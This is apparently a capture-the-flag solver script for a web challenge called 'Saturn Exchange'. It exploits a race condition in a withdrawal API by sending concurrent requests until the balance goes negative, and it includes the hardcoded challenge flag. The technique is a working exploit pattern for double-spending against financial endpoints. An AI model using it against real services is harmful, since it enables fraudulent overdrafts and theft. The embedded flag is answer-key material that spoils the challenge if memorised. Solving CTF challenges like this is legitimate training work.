#!/usr/bin/env python3
"""
Saturn Exchange — WEB Challenge Solver
========================================

Challenge:  Saturn Exchange (UCSI Agentic AI CTF 2026)
Category:   WEB
Flag:       UCSI26{4sync_settlement_r4c3_110cbe1e}

Vulnerability:
    Race condition in the withdrawal settlement system.
    The server accepts pending withdrawals without atomically
    reserving the balance. Multiple concurrent withdrawal requests
    all pass the balance check individually, but when settled
    together, they overdraw the account.

Exploitation:
    1. Reset account to fresh state (balance: 1.0 BTC)
    2. Fire 3 concurrent POST /api/withdraw requests for 0.6 BTC each
    3. All three pass the balance check (1.0 > 0.6) because they
       are processed concurrently before settlement
    4. After settlement: balance = 1.0 - (3 × 0.6) = -0.8 BTC
    5. Negative balance triggers the flag disclosure in /api/balance

Requires:
    - requests
    - aiohttp (for true concurrent requests)
"""

from __future__ import annotations

import asyncio
import time
import requests
import aiohttp
import json
import re

# ── Configuration ─────────────────────────────────────────────────────

BASE_URL = "http://52.76.96.108:3000"
WITHDRAW_AMOUNT = 0.6
NUM_CONCURRENT = 3


# ── Exploit ───────────────────────────────────────────────────────────

def solve():
    """Execute the race condition exploit."""
    session = requests.Session()

    # ── Step 1: Reset the account ──
    print("[*] Step 1: Resetting account...")
    resp = session.post(f"{BASE_URL}/api/reset")
    print(f"    Response: {resp.json()}")

    initial_balance = resp.json().get("balance", 0)
    print(f"    Initial balance: {initial_balance} BTC")
    print()

    # Save cookies for async requests
    cookies = {c.name: c.value for c in session.cookies}

    # ── Step 2: Fire concurrent withdrawal requests ──
    print(f"[*] Step 2: Sending {NUM_CONCURRENT} concurrent withdrawals of {WITHDRAW_AMOUNT} BTC...")
    print(f"    Total withdrawal: {NUM_CONCURRENT * WITHDRAW_AMOUNT} BTC")
    print(f"    Expected final balance: {initial_balance - NUM_CONCURRENT * WITHDRAW_AMOUNT} BTC")
    print()

    results = asyncio.run(_fire_concurrent_withdrawals(cookies))

    for i, result in enumerate(results):
        if isinstance(result, Exception):
            print(f"    Request {i + 1}: ERROR - {result}")
        else:
            print(f"    Request {i + 1}: HTTP {result['status']} - {result['body']}")
    print()

    # ── Step 3: Wait for settlement (with robust polling) ──
    print("[*] Step 3: Waiting for settlement to complete...")
    data = {}
    for attempt in range(1, 11):
        time.sleep(1.5)
        resp = session.post(f"{BASE_URL}/api/balance")
        data = resp.json()
        print(f"    [Attempt {attempt}] Balance: {data.get('balance')}, Pending: {data.get('pending')}")
        if data.get("pending", 0) == 0:
            break

    print()
    print("[*] Step 4: Final balance check...")
    print(f"    Response: {json.dumps(data, indent=2)}")
    print()

    # Extract flag
    response_text = json.dumps(data)
    flag_match = re.search(r"UCSI26\{[a-zA-Z0-9_\-]+\}", response_text)

    if flag_match:
        flag = flag_match.group()
        print(f"[+] FLAG FOUND: {flag}")
        return flag
    elif data.get("flag"):
        print(f"[+] FLAG FOUND: {data['flag']}")
        return data["flag"]
    else:
        print(f"[!] No flag in response. Balance: {data.get('balance')}")

        # If balance is negative, the exploit worked but flag might be elsewhere
        if data.get("balance", 0) < 0:
            print("[*] Balance is negative! Exploit succeeded.")
            print("[*] Try GET /api/balance or check other endpoints")
        return None


async def _fire_concurrent_withdrawals(cookies: dict) -> list:
    """
    Send multiple withdrawal requests simultaneously.

    Uses aiohttp to create truly concurrent connections,
    maximizing the race window.
    """
    async with aiohttp.ClientSession() as session:
        # Set cookies
        for name, value in cookies.items():
            session.cookie_jar.update_cookies({name: value})

        tasks = []
        for i in range(NUM_CONCURRENT):
            tasks.append(
                _single_withdraw(session, i)
            )

        return await asyncio.gather(*tasks, return_exceptions=True)


async def _single_withdraw(session: aiohttp.ClientSession, index: int) -> dict:
    """Send a single withdrawal request."""
    async with session.post(
        f"{BASE_URL}/api/withdraw",
        json={"amount": WITHDRAW_AMOUNT},
        timeout=aiohttp.ClientTimeout(total=10),
    ) as resp:
        body = await resp.text()
        return {
            "index": index,
            "status": resp.status,
            "body": body,
        }


# ── Alternative: Thread-based approach ────────────────────────────────

def solve_threaded():
    """
    Alternative solver using threading instead of asyncio.
    Works when aiohttp is not available.
    """
    import threading

    session = requests.Session()

    # Reset
    print("[*] Resetting account...")
    session.post(f"{BASE_URL}/api/reset")

    results = [None] * NUM_CONCURRENT
    barrier = threading.Barrier(NUM_CONCURRENT)

    def withdraw(idx):
        """Send withdrawal after all threads are ready."""
        barrier.wait()  # Synchronize all threads
        resp = session.post(
            f"{BASE_URL}/api/withdraw",
            json={"amount": WITHDRAW_AMOUNT},
        )
        results[idx] = resp.json()

    # Launch threads
    threads = [threading.Thread(target=withdraw, args=(i,)) for i in range(NUM_CONCURRENT)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print(f"[*] Withdrawal results: {results}")

    # Wait and check
    time.sleep(2)
    resp = session.post(f"{BASE_URL}/api/balance")
    print(f"[*] Balance: {resp.json()}")


# ── Entry Point ───────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 60)
    print("  Saturn Exchange — Async Race Condition Exploit")
    print("  UCSI Agentic AI CTF 2026")
    print("=" * 60)
    print()
    print("[*] Vulnerability: TOCTOU race in withdrawal settlement")
    print(f"[*] Strategy: Send {NUM_CONCURRENT}x {WITHDRAW_AMOUNT} BTC withdrawals concurrently")
    print(f"[*] Target: {BASE_URL}")
    print()

    flag = None
    try:
        flag = solve()
    except Exception as e:
        print(f"[!] Async exploit failed: {e}")
        print("[*] Trying threaded approach...")
        try:
            solve_threaded()
        except Exception as e2:
            print(f"[!] Threaded exploit also failed: {e2}")

    if not flag:
        print()
        print("[!] Replay did not return a verified flag.")
